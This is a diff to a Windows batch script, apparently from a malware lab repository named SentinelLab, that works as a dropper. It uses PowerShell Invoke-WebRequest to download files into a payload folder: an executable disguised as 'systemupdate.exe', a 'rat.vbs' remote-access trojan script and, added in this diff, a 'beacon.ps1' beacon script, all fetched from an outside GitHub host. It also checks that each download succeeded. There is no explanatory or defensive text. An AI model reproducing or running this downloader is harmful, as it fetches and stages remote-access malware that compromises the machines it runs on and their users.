@@ -5,6 +5,7 @@ mkdir "%payloadFolder%"
 :: Attempt to download with PowerShell
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/systemupdate.exe -OutFile '%payloadFolder%\systemupdate.exe'"
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/rat.vbs -OutFile '%payloadFolder%\rat.vbs'"
+powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Oligo12/SentinelLab/main/beacon.ps1 -OutFile '%payloadFolder%\beacon.ps1'"
 
 :: Check if files exist
 if not exist "%payloadFolder%\systemupdate.exe" (
@@ -14,6 +15,11 @@ if not exist "%payloadFolder%\systemupdate.exe" (
 
 if not exist "%payloadFolder%\rat.vbs" (
     echo Failed to download rat.vbs
+    exit /b
+)
+
+if not exist "%payloadFolder%\beacon.ps1" (
+    echo Failed to download beacon.ps1
     exit /b
 )
 
